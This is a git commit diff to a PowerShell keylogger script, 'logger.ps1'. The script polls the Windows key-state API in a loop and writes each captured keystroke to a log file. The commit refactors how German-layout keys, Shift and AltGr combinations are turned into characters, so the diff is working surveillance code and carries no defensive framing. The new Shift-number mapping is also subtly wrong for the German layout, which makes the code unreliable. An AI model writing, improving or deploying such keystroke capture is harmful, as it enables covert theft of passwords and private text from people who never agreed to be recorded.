4d9209e4ab9ec1f8070014d914a272e92da6dd0b
Lukas Pierchalla <git@l.pierchalla.de>
2025-10-29 15:08:42 +0100

    refactor key character mapping for German keyboard layout in logger script

--- logger.ps1
+++ logger.ps1
@@ -26,22 +26,7 @@ function Get-KeyChar {
     $shift = ([Keyboard]::GetAsyncKeyState(16) -ne 0) # Shift-Key
     $caps = ([Keyboard]::GetAsyncKeyState(20) -ne 0) # CapsLock
     $altgr = ([Keyboard]::GetAsyncKeyState(165) -ne 0) # AltGr (rechte Alt-Taste)
-    # Mapping für deutsches Layout
-    $deMap = @{
-        32 = ' '; 13 = "\n"; # Space, Enter
-        48 = '0'; 49 = '1'; 50 = '2'; 51 = '3'; 52 = '4'; 53 = '5'; 54 = '6'; 55 = '7'; 56 = '8'; 57 = '9';
-        186 = 'ö'; 222 = 'ä'; 192 = 'ü'; 219 = '+'; 221 = '#'; 220 = 'ß';
-        188 = ','; 190 = '.'; 191 = '-'; 189 = '-'; 187 = '='; 9 = "\t";
-    }
-    $deShiftMap = @{
-        48 = '='; 49 = '!'; 50 = '"'; 51 = '§'; 52 = '$'; 53 = '%'; 54 = '&'; 55 = '/'; 56 = '('; 57 = ')';
-        186 = 'Ö'; 222 = 'Ä'; 192 = 'Ü'; 219 = '*'; 221 = ''''; 220 = '?';
-        188 = ';'; 190 = ':'; 191 = '_'; 189 = '_'; 187 = '*';
-    }
-    $deAltGrMap = @{
-        81 = '@'; 69 = '€'; 55 = '{'; 56 = '['; 57 = ']'; 48 = '}'; 222 = '"'; 191 = '\\'; 220 = '~';
-    }
-    # Buchstaben
+    # Buchstaben (A-Z)
     if ($char -ge 65 -and $char -le 90) {
         if ($shift -xor $caps) {
             return [char]$char
@@ -49,32 +34,42 @@ function Get-KeyChar {
             return ([char]($char + 32))
         }
     }
-    # Zahlen und Sonderzeichen
+    # Zahlen (0-9) und deren Shift-Variante
     if ($char -ge 48 -and $char -le 57) {
-        if ($altgr -and $deAltGrMap.ContainsKey($char)) {
-            return $deAltGrMap[$char]
-        } elseif ($shift -and $deShiftMap.ContainsKey($char)) {
-            return $deShiftMap[$char]
-        } elseif ($deMap.ContainsKey($char)) {
-            return $deMap[$char]
+        if ($shift) {
+            $shiftNums = @(')','!','"','#','$','%','&','/','(','=')
+            return $shiftNums[$char-48]
         } else {
             return [char]$char
         }
     }
-    # Umlaute und weitere Sonderzeichen
+    # Leertaste
+    if ($char -eq 32) { return ' ' }
+    # Enter
+    if ($char -eq 13) { return "\n" }
+    # Tab
+    if ($char -eq 9) { return "\t" }
+    # Umlaute und Sonderzeichen (DE-Layout, Standardtasten)
+    $deMap = @{
+        186 = 'ö'; 222 = 'ä'; 192 = 'ü'; 220 = 'ß';
+        188 = ','; 190 = '.'; 191 = '-'; 189 = '-'; 187 = '=';
+    }
+    $deShiftMap = @{
+        186 = 'Ö'; 222 = 'Ä'; 192 = 'Ü'; 220 = '?';
+        188 = ';'; 190 = ':'; 191 = '_'; 189 = '_'; 187 = '*';
+    }
+    $deAltGrMap = @{
+        81 = '@'; 69 = '€'; 55 = '{'; 56 = '['; 57 = ']'; 48 = '}'; 222 = '"'; 191 = '\\'; 220 = '~';
+    }
     if ($altgr -and $deAltGrMap.ContainsKey($char)) {
         return $deAltGrMap[$char]
     } elseif ($shift -and $deShiftMap.ContainsKey($char)) {
         return $deShiftMap[$char]
     } elseif ($deMap.ContainsKey($char)) {
         return $deMap[$char]
-    } elseif ($char -eq 32) {
-        return ' '
-    } elseif ($char -eq 13) {
-        return "\n"
-    } else {
-        return [char]$char
     }
+    # Sonst nichts loggen
+    return $null
 }
 
 while ($true) {
@@ -82,10 +77,10 @@ while ($true) {
     if ($elapsed.TotalSeconds -ge $timeout) {
         break
     }
-    foreach ($char in 8,9,13,32..126,186,187,188,189,190,191,192,219,220,221,222) {
+    foreach ($char in 9,13,32,48..57,65..90,186,187,188,189,190,191,192,220,222) {
         if ([Keyboard]::GetAsyncKeyState($char) -eq -32767) {
             $key = Get-KeyChar $char
-            Add-Content -Path $logFile -Value $key
+            if ($key) { Add-Content -Path $logFile -Value $key }
         }
     }
     if ((Get-Date).Second % 20 -eq 0) {
